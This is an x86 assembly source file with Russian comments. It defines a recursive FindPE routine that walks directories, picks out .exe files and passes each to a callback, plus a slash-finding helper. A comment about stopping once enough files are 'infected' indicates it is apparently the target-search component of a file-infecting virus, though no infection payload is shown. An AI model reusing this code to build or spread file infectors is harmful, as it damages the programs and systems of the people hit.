;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;																										 ;
;											search														 ;
;																										 ;
;										    FindPE														 ;
;																										 ; 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;  





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
;функция FindPE
;поиск файлов по маске
;ВХОД ( FindPE(char *szDir,char *szMask, DWORD num_files,PVOID xFunc) ): 
;szDir     - путь (директория), где следует искать файлы (пример 'C:\Games')
;szMask    - маска, по которой искать файлы (пример '\*.*', или '\.exe')
;num_files - сколько файлов будем искать
;xFunc	   - адрес функции вида xFunc(char *szPath, WIN32_FIND_DATA *wfd /*либо нули*/), которая будет 
;			 вызвана при нажоднии нужного файла 
;ВЫХОД:
;все тип-топ :)! 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 
szFullName		equ		dword ptr [ebp-MAX_LEN]
dwAddrWFD		equ		dword ptr [ebp-MAX_LEN-SIZE_WFD]
FindPE:
	pushad
	cld 
	mov		ebp,esp              
	sub		esp,(MAX_LEN+SIZE_WFD)				;выделяем место в стэке для хранения структуры WIN32_FIND_DATA & пути директории + маска  
	lea		edi,szFullName  
	lea		ebx,dwAddrWFD 
	assume	ebx: ptr WIN32_FIND_DATA
	mov		esi,dword ptr [ebp+24h]
	push	edi 
	push	esi
	call	xstrlen								;вызываем функу поиска длины строки 	
	xchg	eax,ecx
	rep		movsb								;сначала скопируем путь директории для поиска
	mov		esi,dword ptr [ebp+28h]
	push	esi
	call	xstrlen
	xchg	eax,ecx
	rep		movsb								;а после к директории прибавим маску
	and		byte ptr [edi],0					;обозначим конец строки  
	pop		edi
	push	ebx  
	push	edi
	call	xFindFirstFileA1					;начинаем поиск 
	inc		eax 
	je		_fpexit_
	dec		eax
;-------------------------------------------------------------------------------------------------------- 
_dir_: 	
	push	eax 
	cmp		dword ptr [ebp+2Ch],0				;если нужное кол-во файлов заинфектилось, то на выход   
	je		_findnext_    
	lea		esi,[ebx].cFileName

	call	search_slash						;вызываем функцию поиска самого последнего слэша, чтобы стереть маску и добавить имя найденного файла/директории 
	  
	test	[ebx].dwFileAttributes,FILE_ATTRIBUTE_DIRECTORY	;мы нашли директорию?  
	je		_pefile_							;иначе мы нашли файл, и переходим 
	cmp		byte ptr [esi],'.'					;проверим, это директория '.' or '..' ?   
	je		_findnext_							;если да, то ищем другие файлы/папки  
;--------------------------------------------------------------------------------------------------------
	dec		dword ptr [ebp+2Ch]					;уменьшаем счетчик       

	push	esi
	call	xstrlen
	xchg	eax,ecx
	rep		movsb								;вместо маски в пути добавим имя только что найденной папки 
	and		byte ptr [edi],0
	lea		edi,szFullName 
	push	dword ptr [ebp+30h]
	push	dword ptr [ebp+2Ch]
	push	dword ptr [ebp+28h]
	push	edi									; 
	call	FindPE								;вызовем функцию поиска файлов/папок (рекурсия)

    call	search_slash						;сотрем имя только что обысканной директории  
    and		byte ptr [edi],0 
    jmp		_findnext_  
;--------------------------------------------------------------------------------------------------------
_pefile_:										;если мы нашли файл 
	push	esi
	call	xstrlen
	push	esi  
	lea		esi,dword ptr [esi+eax-4]
	xchg	eax,ecx   
	push	esi 
	call	small_symbol 
	cmp		dword ptr [esi],'exe.'				;узнаем, это exe-файл? 
	pop		esi    
	jne		_findnext_							;если нет, то продолжаем поиск

	rep		movsb
	and		byte ptr [edi],0
 
	lea		edi,szFullName  
	push	ebx
	push	edi
	call	dword ptr [ebp+30h]					;иначе вызываем функцию, которая должна выполниться при найденных нужных файлах 
	test	eax,eax
	je		_constcounter_	
	dec		dword ptr [ebp+2Ch]					;уменьшаем счетчик 
_constcounter_:	   
	call	search_slash
	and		byte ptr [edi],0 
;-------------------------------------------------------------------------------------------------------- 
_findnext_:
	lea		edi,szFullName 
	pop		eax
	push	eax 
	push	ebx
	push	eax
	call	xFindNextFileA1						;продолжаем поиск 
	test	eax,eax
	pop		eax 
	jne		_dir_
;--------------------------------------------------------------------------------------------------------
	push	eax 
	call	xFindClose1      
	 
_fpexit_: 
	mov		esp,ebp 
	popad 
	ret		4*4
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции FindPE 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx 	 





;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;вспомогательная функа search_slash
;ищет самый крайний справа слэш (чтобы после стереть/добавить имя папки/файла к данному пути)
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
search_slash:
	push	edi
	call	xstrlen  
	add		edi,eax
	mov		al,'\'  
	std 
_ssl_:
	scasb	 
	jne		_ssl_
	inc		edi 
	inc		edi
	cld
	ret
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
;конец функции search_slash 
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx	   

